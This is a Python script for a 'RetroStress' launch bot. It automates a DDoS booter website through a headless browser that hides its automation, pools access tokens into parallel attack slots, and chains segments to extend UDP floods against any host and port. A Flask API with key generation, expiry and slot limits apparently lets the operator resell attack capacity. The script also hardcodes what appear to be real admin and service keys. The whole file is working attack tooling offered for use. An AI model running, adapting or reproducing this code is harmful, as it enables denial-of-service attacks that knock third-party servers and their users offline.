#!/usr/bin/env python3
"""
═════════════════════════════════════════════════════════════════════
RETRO//STRESS CUSTOM LAUNCH BOT, API & MULTI-SLOT ENGINE (v2.0)
═════════════════════════════════════════════════════════════════════
Author  : RetroStress Engine Team
Features:
  ✔ Multi-Token Token Pool (Dynamic Parallel Slots Scaling)
  ✔ Ultra-Fast Chained Attacks (~2s Inter-segment Gap)
  ✔ Hardware-Level Keyboard Event Emulation (Ctrl+A -> Backspace -> Type -> Tab)
  ✔ Session Cookie Auto-Caching & Auto-Renewal
  ✔ Built-in Key Management & Expiry/Slot Limiter
  ✔ REST API Server & Direct CLI Interface
═════════════════════════════════════════════════════════════════════
"""

import os
import sys
import json
import time
import uuid
import secrets
import argparse
import threading
from datetime import datetime, timedelta
from playwright.sync_api import sync_playwright
from flask import Flask, request, jsonify

# ───────────────────────────────────────────────────────────────────
# 1. ENVIRONMENT CONFIGURATION LOADER
# ───────────────────────────────────────────────────────────────────
def load_env_file():
    candidates = ['.env', 'alonexraj.env', os.path.join(os.path.dirname(__file__), '.env')]
    for p in candidates:
        if os.path.isfile(p):
            try:
                with open(p, 'r', encoding='utf-8') as fh:
                    for raw_line in fh:
                        line = raw_line.strip()
                        if not line or line.startswith('#') or '=' not in line:
                            continue
                        k, v = line.split('=', 1)
                        k = k.strip()
                        v = v.strip().strip('"').strip("'")
                        if k and k not in os.environ:
                            os.environ[k] = v
                break
            except Exception:
                pass

load_env_file()

RETROSTRESS_BASE = os.environ.get('RETROSTRESS_BASE', 'https://retrostress.st')
RETROSTRESS_METHOD = os.environ.get('RETROSTRESS_METHOD', 'UDP-BIG')
RETROSTRESS_CATEGORY = os.environ.get('RETROSTRESS_CATEGORY', 'UDP')
RETROSTRESS_HEADFUL = os.environ.get('RETROSTRESS_HEADFUL', 'False').lower() == 'true'
RETROSTRESS_CHUNK_SEC = int(os.environ.get('RETROSTRESS_CHUNK_SEC', 30))
RETROSTRESS_MAX_SEGMENTS = int(os.environ.get('RETROSTRESS_MAX_SEGMENTS', 100))
ADMIN_KEY = os.environ.get('ADMIN_KEY', 'vk-admin-secret-key-2026')
API_LAUNCH_KEY = os.environ.get('API_LAUNCH_KEY', 'vk-2a3176e1b3b4bd8c2')

# Build Dynamic Token Pool (1 Token = 1 Concurrent Slot)
def init_token_pool():
    multi = os.environ.get('RETROSTRESS_API_KEYS', '').strip()
    if multi:
        keys = [k.strip() for k in multi.split(',') if k.strip()]
        if keys:
            return keys
    single = os.environ.get('RETROSTRESS_API_KEY', '25c76a38dd5147c2bca21fe33db7aa1550574a7c6cdd41c680d86306ff7996dc').strip()
    return [single] if single else []

TOKEN_POOL = init_token_pool()

# ───────────────────────────────────────────────────────────────────
# 2. KEY MANAGEMENT & EXPIRY SYSTEM
# ───────────────────────────────────────────────────────────────────
KEYS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'keys.json')
_keys_lock = threading.Lock()
_key_active_attacks = {}  # {key: count}

def load_keys_db():
    with _keys_lock:
        if not os.path.isfile(KEYS_FILE):
            default_data = {}
            if API_LAUNCH_KEY:
                default_data[API_LAUNCH_KEY] = {
                    'key': API_LAUNCH_KEY,
                    'slots': 5,
                    'days': 3650,
                    'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'expires_at': (datetime.now() + timedelta(days=3650)).strftime('%Y-%m-%d %H:%M:%S'),
                    'status': 'active',
                    'notes': 'Master Default Key'
                }
            with open(KEYS_FILE, 'w', encoding='utf-8') as f:
                json.dump(default_data, f, indent=2)
            return default_data

        try:
            with open(KEYS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            return {}

def save_keys_db(data):
    with _keys_lock:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)

def generate_key(days=30, slots=1, custom_key=None, notes=''):
    keys = load_keys_db()
    key_str = custom_key.strip() if custom_key else f"vk-{secrets.token_hex(8)}"
    now = datetime.now()
    days_int = int(days)
    slots_int = max(1, int(slots))

    if days_int <= 0:
        expires_at_str = "Lifetime"
    else:
        expires_at = now + timedelta(days=days_int)
        expires_at_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')

    record = {
        'key': key_str,
        'slots': slots_int,
        'days': days_int,
        'created_at': now.strftime('%Y-%m-%d %H:%M:%S'),
        'expires_at': expires_at_str,
        'status': 'active',
        'notes': notes
    }
    keys[key_str] = record
    save_keys_db(keys)
    return record

def delete_key(key_str):
    keys = load_keys_db()
    if key_str in keys:
        del keys[key_str]
        save_keys_db(keys)
        return True
    return False

def validate_key(key_str):
    if not key_str:
        return False, "Missing API Key", None

    if ADMIN_KEY and key_str == ADMIN_KEY:
        return True, None, {'key': ADMIN_KEY, 'slots': len(TOKEN_POOL), 'expires_at': 'Lifetime'}

    keys = load_keys_db()
    if key_str not in keys:
        if API_LAUNCH_KEY and key_str == API_LAUNCH_KEY:
            return True, None, {'key': API_LAUNCH_KEY, 'slots': 5, 'expires_at': 'Lifetime'}
        return False, "Invalid API Key", None

    kinfo = keys[key_str]
    if kinfo.get('status') != 'active':
        return False, "Key is disabled or inactive", None

    expires_at_str = kinfo.get('expires_at')
    if expires_at_str and expires_at_str != 'Lifetime':
        try:
            exp_date = datetime.strptime(expires_at_str, '%Y-%m-%d %H:%M:%S')
            if datetime.now() > exp_date:
                return False, f"Key expired on {expires_at_str}", None
        except Exception:
            pass

    return True, None, kinfo

def acquire_key_slot(key_str, max_slots):
    with _keys_lock:
        current = _key_active_attacks.get(key_str, 0)
        if current >= max_slots:
            return False
        _key_active_attacks[key_str] = current + 1
        return True

def release_key_slot(key_str):
    with _keys_lock:
        if key_str in _key_active_attacks:
            _key_active_attacks[key_str] = max(0, _key_active_attacks[key_str] - 1)

# ───────────────────────────────────────────────────────────────────
# 3. PARALLEL SLOTS TRACKER
# ───────────────────────────────────────────────────────────────────
_slot_lock = threading.Lock()
_slot_busy = [False] * max(1, len(TOKEN_POOL))

def acquire_free_slot():
    with _slot_lock:
        for idx in range(len(TOKEN_POOL)):
            if not _slot_busy[idx]:
                _slot_busy[idx] = True
                return idx
    return None

def release_slot(slot_idx):
    with _slot_lock:
        if 0 <= slot_idx < len(_slot_busy):
            _slot_busy[slot_idx] = False

def get_slots_status():
    with _slot_lock:
        busy = sum(1 for b in _slot_busy if b)
        total = len(TOKEN_POOL)
        return {'total': total, 'busy': busy, 'free': total - busy}

def norm_label(text):
    return ' '.join((text or '').replace('\n', ' ').replace('ⓘ', '').replace('▾', '').strip().upper().split())

# ───────────────────────────────────────────────────────────────────
# 4. SESSION AUTHENTICATION & COOKIE MANAGER
# ───────────────────────────────────────────────────────────────────
def ensure_slot_session(slot_idx, access_key):
    base_dir = os.path.dirname(os.path.abspath(__file__))
    cookies_file = f"rs_session_{slot_idx}.json"
    cookies_path = os.path.join(base_dir, cookies_file)

    if os.path.isfile(cookies_path):
        try:
            with open(cookies_path, 'r', encoding='utf-8') as fh:
                data = json.load(fh)
            if data.get('cookies') and len(data['cookies']) > 0:
                return True, cookies_file
        except Exception:
            pass

    print(f"[*] [Slot-{slot_idx + 1}] Authenticating on {RETROSTRESS_BASE}/auth ...")
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--disable-blink-features=AutomationControlled',
                    '--no-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-web-security'
                ]
            )
            context = browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                viewport={'width': 1440, 'height': 900}
            )
            page = context.new_page()
            page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

            page.goto(f"{RETROSTRESS_BASE}/auth", wait_until='domcontentloaded', timeout=30000)
            page.wait_for_timeout(2000)

            page.fill('#accessKey', access_key)
            page.wait_for_timeout(300)
            page.click('#loginSubmitBtn')
            page.wait_for_timeout(3500)

            cookies = context.cookies()
            if len(cookies) > 0 and 'auth' not in page.url:
                with open(cookies_path, 'w', encoding='utf-8') as f:
                    json.dump({'site': RETROSTRESS_BASE, 'cookies': cookies}, f, indent=2)
                print(f"[✓] [Slot-{slot_idx + 1}] Session established & cached ({cookies_file})")
                browser.close()
                return True, cookies_file
            else:
                browser.close()
                return False, None
    except Exception as e:
        print(f"[!] [Slot-{slot_idx + 1}] Login Error: {e}")
        return False, None

# ───────────────────────────────────────────────────────────────────
# 5. CORE EXECUTION ENGINE (CHAINING & ROBUST DOM HANDLING)
# ───────────────────────────────────────────────────────────────────
def run_single_slot_chain(slot_idx, host, port, time_val=30, method=None, category=None, headless=True):
    if slot_idx < 0 or slot_idx >= len(TOKEN_POOL):
        return False, f"Invalid slot index {slot_idx}"

    access_key = TOKEN_POOL[slot_idx]
    success_login, cookies_file = ensure_slot_session(slot_idx, access_key)
    if not success_login:
        return False, f"[Slot-{slot_idx + 1}] Authentication failed"

    base_dir = os.path.dirname(os.path.abspath(__file__))
    cookies_path = os.path.join(base_dir, cookies_file)
    with open(cookies_path, 'r', encoding='utf-8') as fh:
        data = json.load(fh)

    cookies = [{
        'name': c['name'],
        'value': c['value'],
        'domain': c.get('domain') or '.retrostress.st',
        'path': c.get('path') or '/'
    } for c in data.get('cookies', [])]

    target_method = method or RETROSTRESS_METHOD or 'UDP-BIG'
    target_category = category or RETROSTRESS_CATEGORY or 'UDP'
    chunk = RETROSTRESS_CHUNK_SEC or 30

    try:
        total_sec = max(1, int(time_val))
    except Exception:
        total_sec = 30
    segments = min(RETROSTRESS_MAX_SEGMENTS, -(-total_sec // chunk))

    print(f"\n[🚀 SLOT-{slot_idx + 1} LAUNCH] Target: {host}:{port} | Duration: {total_sec}s ({segments} segment(s)) | Method: {target_method}")

    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=headless,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox', '--disable-dev-shm-usage']
            )
            context = browser.new_context(
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
                viewport={'width': 1440, 'height': 900}
            )
            context.add_cookies(cookies)
            page = context.new_page()
            page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

            panel_url = f"{RETROSTRESS_BASE}/panel"
            page.goto(panel_url, wait_until='domcontentloaded', timeout=45000)
            page.wait_for_timeout(2000)

            # Session Auto-Refresh Check
            if 'auth' in page.url or page.query_selector('#accessKey'):
                print(f"[*] Session refresh needed on Slot-{slot_idx + 1}...")
                page.fill('#accessKey', access_key)
                page.click('#loginSubmitBtn')
                page.wait_for_timeout(3000)
                page.goto(panel_url, wait_until='domcontentloaded', timeout=45000)
                page.wait_for_timeout(1500)

            IP_SEL = "input.ct-input.ct-mono[type='text']"
            PORT_SEL = "input.ct-input.ct-mono[type='number']"

            # Hardware Keyboard Input Simulation
            def _fill_input_robust(selector, val):
                page.wait_for_selector(selector, timeout=8000)
                page.click(selector)
                page.wait_for_timeout(100)
                page.keyboard.press('Control+A')
                page.keyboard.press('Backspace')
                page.keyboard.type(str(val), delay=35)
                page.keyboard.press('Tab')
                page.wait_for_timeout(200)

            def _wait_slot_free(max_wait=45):
                waited = 0
                while waited < max_wait:
                    try:
                        body_text = page.inner_text("body") or ''
                        if 'RUNNING' not in body_text and ('No active tests' in body_text or '0 of' in body_text or '0 slots free' not in body_text):
                            return True
                    except Exception:
                        pass
                    page.wait_for_timeout(1000)
                    waited += 1
                return True

            def _click_pill(cat_name):
                for _ in range(8):
                    for pill in page.query_selector_all("button.ct-pill"):
                        try:
                            if pill.inner_text().strip().upper() == cat_name.strip().upper():
                                pill.click()
                                page.wait_for_timeout(300)
                                return True
                        except Exception:
                            continue
                    page.wait_for_timeout(300)
                return False

            def _ensure_method(m_target):
                nt = norm_label(m_target)
                for _ in range(8):
                    trigs = page.query_selector_all("button.ct-combo-trigger")
                    if not trigs:
                        page.wait_for_timeout(400)
                        continue
                    if norm_label(trigs[0].inner_text()) == nt:
                        return True
                    try:
                        trigs[0].click()
                        page.wait_for_timeout(400)
                    except Exception:
                        pass
                    items = page.query_selector_all(".ct-combo-item")
                    matched = False
                    for it in items:
                        if nt in norm_label(it.inner_text()):
                            try:
                                it.click()
                                matched = True
                                page.wait_for_timeout(400)
                                break
                            except Exception:
                                pass
                    if matched:
                        return True
                    page.keyboard.press("Escape")
                    page.wait_for_timeout(300)
                return False

            def _wait_btn(max_wait=30):
                waited = 0
                while waited < max_wait:
                    btn = page.query_selector("button.ct-launch")
                    if btn:
                        try:
                            if btn.get_attribute('disabled') is None:
                                return btn
                        except Exception:
                            pass
                    page.wait_for_timeout(1000)
                    waited += 1
                return None

            launched = 0

            # Chaining Segments Loop
            for i in range(segments):
                print(f"[*] [Slot-{slot_idx + 1}] Segment {i+1}/{segments} ...")
                if i > 0:
                    _wait_slot_free(chunk + 10)

                # 1. Fill Target Host & Port
                _fill_input_robust(IP_SEL, str(host))
                _fill_input_robust(PORT_SEL, str(port))

                # 2. Select Category & Method
                _click_pill(target_category)
                page.wait_for_timeout(300)
                _ensure_method(target_method)
                page.wait_for_timeout(300)

                # 3. Trigger EXECUTE_TEST Button
                btn = _wait_btn(30)
                if not btn:
                    browser.close()
                    return False, f"[Slot-{slot_idx + 1}] EXECUTE_TEST button disabled"

                clicked = False
                for _ in range(5):
                    try:
                        btn.click()
                        clicked = True
                        break
                    except Exception:
                        page.wait_for_timeout(500)
                        btn = page.query_selector("button.ct-launch")

                if not clicked:
                    browser.close()
                    return False, f"[Slot-{slot_idx + 1}] Click failed"

                launched += 1
                print(f"    [🔥 SUCCESS] [Slot-{slot_idx + 1}] Segment {i+1}/{segments} Active! (Method: {target_method})")

                if i < segments - 1:
                    print(f"    [*] Waiting {chunk}s for next segment in chain...")
                    time.sleep(max(1, chunk - 3))
                    _wait_slot_free(30)

            browser.close()
            if launched:
                return True, f"Attack successfully sent to {host}:{port} for {launched * chunk}s via {target_method}"
            return False, "No segment was launched"

    except Exception as e:
        return False, f"Execution Error: {e}"

def dispatch_attack(host, port, time_val=30, method=None, category=None, slot_idx=None, headless=True):
    if slot_idx is None:
        slot_idx = acquire_free_slot()
        if slot_idx is None:
            return False, f"All {len(TOKEN_POOL)} slot(s) are currently BUSY. Try again later."
        auto_acquired = True
    else:
        auto_acquired = False

    try:
        return run_single_slot_chain(
            slot_idx=slot_idx,
            host=host,
            port=port,
            time_val=time_val,
            method=method,
            category=category,
            headless=headless
        )
    finally:
        if auto_acquired:
            release_slot(slot_idx)

# ───────────────────────────────────────────────────────────────────
# 6. FLASK REST API SERVER
# ───────────────────────────────────────────────────────────────────
app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return jsonify({
        'status': 'online',
        'service': 'RetroStress Launch API & Key Manager v2.0',
        'slots': get_slots_status()
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'alive'})

@app.route('/slots', methods=['GET'])
def api_slots():
    return jsonify(get_slots_status())

@app.route('/api/v1/key/generate', methods=['GET', 'POST'])
def api_key_generate():
    args = request.args
    json_body = request.get_json(silent=True) or {}
    form_body = request.form or {}

    admin_key = args.get('admin_key') or json_body.get('admin_key') or form_body.get('admin_key') or ''
    if admin_key != ADMIN_KEY:
        return jsonify({'status': 'error', 'message': 'Unauthorized. Admin key required'}), 403

    days = args.get('days') or json_body.get('days') or form_body.get('days') or 30
    slots = args.get('slots') or json_body.get('slots') or form_body.get('slots') or 1
    custom_key = args.get('key') or json_body.get('key') or form_body.get('key')
    notes = args.get('notes') or json_body.get('notes') or form_body.get('notes') or ''

    try:
        days = int(days)
        slots = int(slots)
    except Exception:
        return jsonify({'status': 'error', 'message': 'Invalid days or slots parameter'}), 400

    rec = generate_key(days=days, slots=slots, custom_key=custom_key, notes=notes)
    return jsonify({
        'status': 'success',
        'message': 'Key generated successfully',
        'key': rec['key'],
        'slots': rec['slots'],
        'days': rec['days'],
        'expires_at': rec['expires_at']
    }), 200

@app.route('/api/v1/key/list', methods=['GET'])
def api_key_list():
    admin_key = request.args.get('admin_key', '')
    if admin_key != ADMIN_KEY:
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403
    return jsonify({
        'status': 'success',
        'keys': load_keys_db()
    }), 200

@app.route('/api/v1/key/delete', methods=['GET', 'POST'])
def api_key_delete():
    args = request.args
    admin_key = args.get('admin_key', '')
    key_to_del = args.get('key', '')
    if admin_key != ADMIN_KEY:
        return jsonify({'status': 'error', 'message': 'Unauthorized'}), 403
    if not key_to_del:
        return jsonify({'status': 'error', 'message': 'Missing key'}), 400
    if delete_key(key_to_del):
        return jsonify({'status': 'success', 'message': f'Key {key_to_del} deleted'}), 200
    return jsonify({'status': 'error', 'message': 'Key not found'}), 404

@app.route('/api/v1/key/info', methods=['GET'])
def api_key_info():
    key = request.args.get('key', '').strip()
    valid, err, kinfo = validate_key(key)
    if not valid:
        return jsonify({'status': 'error', 'message': err}), 400
    return jsonify({
        'status': 'success',
        'key': kinfo.get('key'),
        'slots': kinfo.get('slots', 1),
        'expires_at': kinfo.get('expires_at')
    }), 200

@app.route('/api/v1/launch/start', methods=['GET', 'POST'])
@app.route('/api/launch', methods=['GET', 'POST'])
@app.route('/execute', methods=['GET', 'POST'])
def api_launch_start():
    args = request.args
    json_body = request.get_json(silent=True) or {}
    form_body = request.form or {}

    key = args.get('key') or json_body.get('key') or form_body.get('key') or ''
    ip = args.get('ip') or args.get('host') or json_body.get('ip') or json_body.get('host') or form_body.get('ip') or ''
    port_val = args.get('port') or json_body.get('port') or form_body.get('port') or '80'
    time_val = args.get('time') or json_body.get('time') or form_body.get('time') or '30'
    method = args.get('method') or json_body.get('method') or form_body.get('method') or RETROSTRESS_METHOD
    category = args.get('category') or json_body.get('category') or form_body.get('category') or RETROSTRESS_CATEGORY

    # 1. API Key Validation
    valid, err_msg, key_info = validate_key(key)
    if not valid:
        return jsonify({'status': 'error', 'message': err_msg}), 403

    # 2. Key Slot Limit Check
    key_max_slots = key_info.get('slots', 1)
    if not acquire_key_slot(key, key_max_slots):
        return jsonify({
            'status': 'error',
            'message': f'Slot limit reached. Max {key_max_slots} concurrent attack(s) allowed for your key.'
        }), 429

    # 3. IP Validation
    ip = str(ip).strip()
    if not ip or ip == '{ip}':
        release_key_slot(key)
        return jsonify({'status': 'error', 'message': 'Missing target IP'}), 400

    try:
        time_int = int(time_val)
    except Exception:
        time_int = 30

    # 4. Server Slot Check
    slot_idx = acquire_free_slot()
    if slot_idx is None:
        release_key_slot(key)
        return jsonify({'status': 'error', 'message': 'Server slots busy, retry later'}), 503

    # 5. Background Thread Worker
    def _run_worker(s_idx, user_key):
        try:
            run_single_slot_chain(
                slot_idx=s_idx,
                host=ip,
                port=port_val,
                time_val=time_int,
                method=method,
                category=category,
                headless=not RETROSTRESS_HEADFUL
            )
        finally:
            release_slot(s_idx)
            release_key_slot(user_key)

    threading.Thread(target=_run_worker, args=(slot_idx, key), daemon=True).start()

    return jsonify({
        'status': 'success',
        'message': 'Launch successful',
        'target': ip,
        'port': port_val,
        'duration': time_int,
        'method': method,
        'slot': slot_idx + 1
    }), 200

def start_server(port=5000):
    print(f"\n[✓] RETRO//STRESS LAUNCH API & KEY MANAGER STARTED on port {port}")
    print(f"[✓] Admin Key: {ADMIN_KEY}")
    print(f"[✓] Master Key: {API_LAUNCH_KEY}")
    print(f"[✓] Total Available Slots: {len(TOKEN_POOL)}\n")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

# ───────────────────────────────────────────────────────────────────
# 7. CLI ENTRYPOINT
# ───────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="RetroStress Custom Launch Bot & API (v2.0)")
    parser.add_argument('--server', action='store_true', default=False, help="Run as REST API server")
    parser.add_argument('--port', type=int, default=5000, help="Server port (default: 5000)")
    parser.add_argument('--host', type=str, help="CLI Run: Target Host / IP")
    parser.add_argument('--target-port', type=str, default="80", help="CLI Run: Target Port")
    parser.add_argument('--time', type=int, default=30, help="CLI Run: Test Duration in Seconds")
    parser.add_argument('--method', type=str, default="UDP-BIG", help="CLI Run: Method")
    parser.add_argument('--headful', action='store_true', help="Show visual browser UI")

    # Key Management CLI Flags
    parser.add_argument('--gen-key', action='store_true', help="Generate a new API key")
    parser.add_argument('--days', type=int, default=30, help="Days validity for key (0 = lifetime, default: 30)")
    parser.add_argument('--slots', type=int, default=1, help="Max concurrent slots for key (default: 1)")
    parser.add_argument('--custom-key', type=str, default=None, help="Custom key name (optional)")
    parser.add_argument('--list-keys', action='store_true', help="List all generated keys")
    parser.add_argument('--delete-key', type=str, default=None, help="Delete a specific key")

    args = parser.parse_args()

    if args.gen_key:
        rec = generate_key(days=args.days, slots=args.slots, custom_key=args.custom_key)
        print("\n" + "="*50)
        print("          NEW API KEY GENERATED")
        print("="*50)
        print(f" Key       : {rec['key']}")
        print(f" Slots     : {rec['slots']}")
        print(f" Validity  : {rec['days']} Day(s)")
        print(f" Expires At: {rec['expires_at']}")
        print("="*50 + "\n")
    elif args.list_keys:
        all_k = load_keys_db()
        print("\n" + "="*70)
        print(f"{'KEY':<24} | {'SLOTS':<6} | {'STATUS':<8} | {'EXPIRES AT'}")
        print("="*70)
        for k, v in all_k.items():
            print(f"{k:<24} | {v.get('slots', 1):<6} | {v.get('status','active'):<8} | {v.get('expires_at')}")
        print("="*70 + "\n")
    elif args.delete_key:
        if delete_key(args.delete_key):
            print(f"[✓] Key '{args.delete_key}' successfully deleted.")
        else:
            print(f"[!] Key '{args.delete_key}' not found.")
    elif args.host:
        success, msg = dispatch_attack(
            host=args.host,
            port=args.target_port,
            time_val=args.time,
            method=args.method,
            headless=not args.headful
        )
        print(f"\nResult: {'SUCCESS' if success else 'FAILED'}")
        print(f"Message: {msg}")
    else:
        start_server(port=args.port)
